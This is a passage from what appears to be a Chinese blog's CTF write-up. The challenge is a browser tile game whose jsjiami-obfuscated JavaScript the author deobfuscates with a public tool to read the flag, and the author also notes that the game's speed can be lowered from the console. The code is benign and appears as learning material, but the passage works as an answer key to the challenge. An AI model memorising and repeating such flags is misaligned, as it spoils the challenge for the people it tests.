class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;3&#x27;</span>:<span class="keyword">var</span> _0x1cb1ea=_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;66&#x27;</span>)]($,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;35&#x27;</span>));<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;4&#x27;</span>:_0x1cb1ea[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;38&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;39&#x27;</span>)]=<span class="string">&#x27;-408px&#x27;</span>;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;5&#x27;</span>:_0x1cb1ea[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]=<span class="string">&#x27;&#x27;</span>;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;6&#x27;</span>:result=![];<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;7&#x27;</span>:<span class="title function_">check_action</span>();<span class="keyword">continue</span>;&#125;<span class="keyword">break</span>;&#125;&#125;&#125;&#125;<span class="keyword">function</span> <span class="title function_">score</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x46c9a8=&#123;<span class="string">&#x27;umTQz&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x5f2b56,_0x242990</span>)&#123;<span class="keyword">return</span> _0x5f2b56+_0x242990;&#125;,<span class="string">&#x27;ARCNA&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xfad634,_0x337d72</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0xfad634</span>(_0x337d72);&#125;,<span class="string">&#x27;EzhLo&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x29f7e7,_0x5ac2d2</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x29f7e7</span>(_0x5ac2d2);&#125;,<span class="string">&#x27;CPlbK&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;46&#x27;</span>),<span class="string">&#x27;nYpQm&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xb5ea2e,_0x53a641</span>)&#123;<span class="keyword">return</span> _0xb5ea2e==_0x53a641;&#125;,<span class="string">&#x27;fnuqu&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x4b9f96</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x4b9f96</span>();&#125;&#125;;<span class="keyword">var</span> _0x1a84ef=_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;67&#x27;</span>)](<span class="built_in">parseInt</span>(_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;68&#x27;</span>)]($,<span class="string">&#x27;score&#x27;</span>)[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]),<span class="number">0x1</span>);_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;69&#x27;</span>)]($,_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;6a&#x27;</span>)])[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]=_0x1a84ef;<span class="keyword">if</span>(_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;6b&#x27;</span>)](_0x1a84ef%<span class="number">0xa</span>,<span class="number">0x0</span>))&#123;_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;6c&#x27;</span>)](speedup);&#125;&#125;;_0xodh=<span class="string">&#x27;jsjiami.com.v6&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码又臭又长，但是在代码的前面已经提醒我们这里是经过jsjiami.v6加密过的，网上有直接的解密工具**<a href="https://github.com/zhangyanlin2022/JsjiamiV6-Decryptor-1">JsjiamiV6-Decryptor</a>**，项目的README中有解释利用方法，直接根据该方法利用即可：</p><p><a href="https://pic.imgdb.cn/item/62668ae9239250f7c599dac5.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668ae9239250f7c599dac5.png"></a></p><p>接下来直接查看解密之后的文件DecryptResult5.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">$</span>(<span class="params">_0x4c27d2</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(_0x4c27d2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">creatediv</span>(<span class="params">_0x1e165d</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x138beb=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">    _0x138beb.<span class="property">className</span>=_0x1e165d;</span><br><span class="line">    <span class="keyword">return</span> _0x138beb;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> clock=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> state=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> speed=<span class="number">6</span>;</span><br><span class="line"><span class="keyword">var</span> result=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">var</span> flag=[<span class="string">&#x27;com&#x27;</span>,<span class="string">&#x27;aha_&#x27;</span>,<span class="string">&#x27;eat_&#x27;</span>,<span class="string">&#x27;!&#125;&#x27;</span>,<span class="string">&#x27;e_on&#x27;</span>,<span class="string">&#x27;re_gr&#x27;</span>,<span class="string">&#x27;rt&#123;h&#x27;</span>,<span class="string">&#x27;you_a&#x27;</span>,<span class="string">&#x27;sne&#x27;</span>];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!result)&#123;</span><br><span class="line">        <span class="title function_">init</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;游戏已经开始，无需再次点击！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>)&#123;</span><br><span class="line">    result=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> _0x340b33=<span class="number">0</span>;_0x340b33&lt;<span class="number">4</span>;_0x340b33++)&#123;</span><br><span class="line">        <span class="title function_">createrow</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="string">&#x27;main&#x27;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params">_0x5abac5</span>)&#123;</span><br><span class="line">        _0x5abac5=(_0x5abac5||event);</span><br><span class="line">        <span class="title function_">judge</span>(_0x5abac5);</span><br><span class="line">    &#125;;</span><br><span class="line">    clock=<span class="variable language_">window</span>.<span class="built_in">setInterval</span>(<span class="string">&#x27;move()&#x27;</span>,<span class="number">30</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_action</span>(<span class="params"></span>)&#123;</span><br><span class="line">    flag=((((flag[<span class="number">8</span>]+flag[<span class="number">6</span>])+flag[<span class="number">1</span>]+flag[<span class="number">7</span>])+flag[<span class="number">5</span>]+flag[<span class="number">2</span>])+flag[<span class="number">0</span>]+flag[<span class="number">4</span>]+flag[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createrow</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x3b3385=$(<span class="string">&#x27;con&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> _0x5afcef=<span class="title function_">creatediv</span>(<span class="string">&#x27;row&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> _0xf09bdd=<span class="title function_">createcell</span>();</span><br><span class="line">    _0x3b3385.<span class="title function_">appendChild</span>(_0x5afcef);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> _0xa4a713=<span class="number">0</span>;_0xa4a713&lt;<span class="number">4</span>;_0xa4a713++)&#123;</span><br><span class="line">        _0x5afcef.<span class="title function_">appendChild</span>(<span class="title function_">creatediv</span>(_0xf09bdd[_0xa4a713]));</span><br><span class="line">    &#125;<span class="keyword">if</span>(_0x3b3385.<span class="property">firstChild</span>==<span class="literal">null</span>)&#123;</span><br><span class="line">        _0x3b3385.<span class="title function_">appendChild</span>(_0x5afcef);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        _0x3b3385.<span class="title function_">insertBefore</span>(_0x5afcef,_0x3b3385.<span class="property">firstChild</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">delrow</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x13b8d4=$(<span class="string">&#x27;con&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(_0x13b8d4.<span class="property">childNodes</span>.<span class="property">length</span>==<span class="number">6</span>)&#123;</span><br><span class="line">        _0x13b8d4.<span class="title function_">removeChild</span>(_0x13b8d4.<span class="property">lastChild</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createcell</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x350dc0=[<span class="string">&#x27;cell&#x27;</span>,<span class="string">&#x27;cell&#x27;</span>,<span class="string">&#x27;cell&#x27;</span>,<span class="string">&#x27;cell&#x27;</span>];</span><br><span class="line">    <span class="keyword">var</span> _0x143001=<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">4</span>);</span><br><span class="line">    _0x350dc0[_0x143001]=<span class="string">&#x27;cell black&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> _0x350dc0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">move</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x7d254e=$(<span class="string">&#x27;con&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> _0xcb4af7=<span class="built_in">parseInt</span>(<span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(_0x7d254e,<span class="literal">null</span>).<span class="property">top</span>);</span><br><span class="line">    <span class="keyword">if</span>(speed+_0xcb4af7&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        _0xcb4af7=<span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        _0xcb4af7+=speed;</span><br><span class="line">    &#125;</span><br><span class="line">    _0x7d254e.<span class="property">style</span>.<span class="property">top</span>=_0xcb4af7+<span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">    <span class="title function_">over</span>();</span><br><span class="line">    <span class="keyword">if</span>(_0xcb4af7==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="title function_">createrow</span>();</span><br><span class="line">        _0x7d254e.<span class="property">style</span>.<span class="property">top</span>=<span class="string">&#x27;-101px&#x27;</span>;</span><br><span class="line">        <span class="title function_">delrow</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">speedup</span>(<span class="params"></span>)&#123;</span><br><span class="line">    speed+=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(speed==<span class="number">20</span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;你超神了！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">over</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5d88ab=con.<span class="property">childNodes</span>;</span><br><span class="line">    <span class="keyword">if</span>(_0x5d88ab.<span class="property">length</span>==<span class="number">5</span>&amp;&amp;(_0x5d88ab[_0x5d88ab.<span class="property">length</span>-<span class="number">1</span>].<span class="property">pass</span>!==<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="title function_">fail</span>();</span><br><span class="line">    &#125;<span class="keyword">for</span>(<span class="keyword">let</span> _0x2f89b3=<span class="number">0</span>;_0x2f89b3&lt;_0x5d88ab.<span class="property">length</span>;_0x2f89b3++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(_0x5d88ab[_0x2f89b3].<span class="property">pass1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="title function_">fail</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fail</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(clock);</span><br><span class="line">    result=<span class="literal">false</span>;</span><br><span class="line">    <span class="title function_">check_action</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">parseInt</span>($(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>)&gt;<span class="number">110</span>)&#123;</span><br><span class="line">        <span class="title function_">confirm</span>(<span class="string">&#x27;浣犵殑鏈€缁堝緱鍒哱x20&#x27;</span>+<span class="built_in">parseInt</span>($(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>)+<span class="string">&#x27;   浣犵殑flag涓�&#x27;</span>+flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">confirm</span>(<span class="string">&#x27;你的最终得分 &#x27;</span>+<span class="built_in">parseInt</span>($(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>)+<span class="string">&#x27;   哈哈，就这水平还想拿flag？&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> _0x35bf64=$(<span class="string">&#x27;con&#x27;</span>);</span><br><span class="line">    _0x35bf64.<span class="property">innerHTML</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>=<span class="number">0</span>;</span><br><span class="line">    _0x35bf64.<span class="property">style</span>.<span class="property">top</span>=<span class="string">&#x27;-408px&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">judge</span>(<span class="params">_0x545af0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(_0x545af0.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;black&#x27;</span>)==-<span class="number">1</span>&amp;&amp;(_0x545af0.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;cell&#x27;</span>)!=-<span class="number">1</span>))&#123;</span><br><span class="line">        _0x545af0.<span class="property">target</span>.<span class="property">parentNode</span>.<span class="property">pass1</span>=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(_0x545af0.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;black&#x27;</span>)!=-<span class="number">1</span>)&#123;</span><br><span class="line">        _0x545af0.<span class="property">target</span>.<span class="property">className</span>=<span class="string">&#x27;cell&#x27;</span>;</span><br><span class="line">        _0x545af0.<span class="property">target</span>.<span class="property">parentNode</span>.<span class="property">pass</span>=<span class="number">1</span>;</span><br><span class="line">        <span class="title function_">score</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">score</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x1a84ef=(<span class="built_in">parseInt</span>($(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>)+<span class="number">1</span>);</span><br><span class="line">    $(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>=_0x1a84ef;</span><br><span class="line">    <span class="keyword">if</span>(_0x1a84ef%<span class="number">10</span>==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="title function_">speedup</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这下代码就变得很简单易读了，我们可以直接通过flag的定义拿到flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flag=[<span class="string">&#x27;com&#x27;</span>,<span class="string">&#x27;aha_&#x27;</span>,<span class="string">&#x27;eat_&#x27;</span>,<span class="string">&#x27;!&#125;&#x27;</span>,<span class="string">&#x27;e_on&#x27;</span>,<span class="string">&#x27;re_gr&#x27;</span>,<span class="string">&#x27;rt&#123;h&#x27;</span>,<span class="string">&#x27;you_a&#x27;</span>,<span class="string">&#x27;sne&#x27;</span>];</span><br><span class="line">flag=((((flag[<span class="number">8</span>]+flag[<span class="number">6</span>])+flag[<span class="number">1</span>]+flag[<span class="number">7</span>])+flag[<span class="number">5</span>]+flag[<span class="number">2</span>])+flag[<span class="number">0</span>]+flag[<span class="number">4</span>]+flag[<span class="number">3</span>]);</span><br></pre></td></tr></table></figure><p>也可以通过在控制台中减小javascript中的的speed变量然后玩游戏拿到110分，因为通过审计代码我们可以发现speed是控制游戏运行速度的变量。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
